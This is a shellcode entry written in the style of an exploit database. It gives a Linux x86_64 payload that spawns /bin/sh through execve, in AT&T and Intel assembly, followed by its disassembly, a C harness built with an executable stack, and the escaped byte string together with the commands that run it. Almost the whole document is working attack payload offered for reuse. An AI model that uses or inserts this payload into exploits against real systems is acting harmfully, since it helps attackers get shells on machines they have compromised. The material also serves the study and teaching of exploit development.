# Exploit Title: Shellcode /bin/sh for Linux x86_64 (different approach)
# Date: 2015-09-10
# Exploit Author: Fanda Uchytil
# Version: 1
# Tested on: Linux 3.16.0-4-amd64 (Debian), 2.6.32-openvz-042stab093.5-amd64 (Centos/RHEL based), 2.6.32-5-amd64 (Debian)


AT&T VERSION (for smooth debug)
-------------------------------

.global _start
.text
_start:
    # int execve(const char *filename, char *const argv[], char *const envp[]);
    xor     %rax, %rax
    add     $59, %rax                   # Linux 64b execve
    xor     %rdi, %rdi
    push    %rdi                        # '\0' for termination of string below
    mov     $0x68732F2f6e69622F, %rdi   # "/bin//sh" (slash padding)
    push    %rdi
    lea     (%rsp), %rdi
    xor     %rsi, %rsi                  # no shell arguments
    xor     %rdx, %rdx                  # no env vars
    syscall


$ gcc -nostdlib shellcode_atnt.s -o shellcode_atnt && objdump -d shellcode_atnt
$ ./shellcode_atnt
$ gdb -q ./shellcode_atnt


Disassembly of section .text:
  4000d4:       48 31 c0                xor    %rax,%rax
  4000d7:       48 83 c0 3b             add    $0x3b,%rax
  4000db:       48 31 ff                xor    %rdi,%rdi
  4000de:       57                      push   %rdi
  4000df:       48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
  4000e6:       2f 73 68
  4000e9:       57                      push   %rdi
  4000ea:       48 8d 3c 24             lea    (%rsp),%rdi
  4000ee:       48 31 f6                xor    %rsi,%rsi
  4000f1:       48 31 d2                xor    %rdx,%rdx
  4000f4:       0f 05                   syscall




INTEL VERSION
-------------

    BITS 64
    xor rax, rax
    add rax, 59
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732F2f6e69622F
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    syscall


$ nasm shellcode.a




SHELLCODE_TEST.C
----------------

  int main(int argc, char **argv) {
      int (*f)() = (int(*)()) argv[1];
      return (*f)();
  }


$ gcc -o shellcode_test shellcode_test.c -z execstack     # or use `execstack(8)` before command below
$ ./shellcode_test "$(cat shellcode)"




STRING
------

$ xxd -p -c 256 shellcode | tr -d '\n' | sed 's/../\\&/g'
\48\31\c0\48\83\c0\3b\48\31\ff\57\48\bf\2f\62\69\6e\2f\2f\73\68\57\48\8d\3c\24\48\31\f6\48\31\d2\0f\05

$ ./shellcode_test "$(printf "$(xxd -p -c 256 shellcode | tr -d '\n' | sed 's/../\\x&/g')")"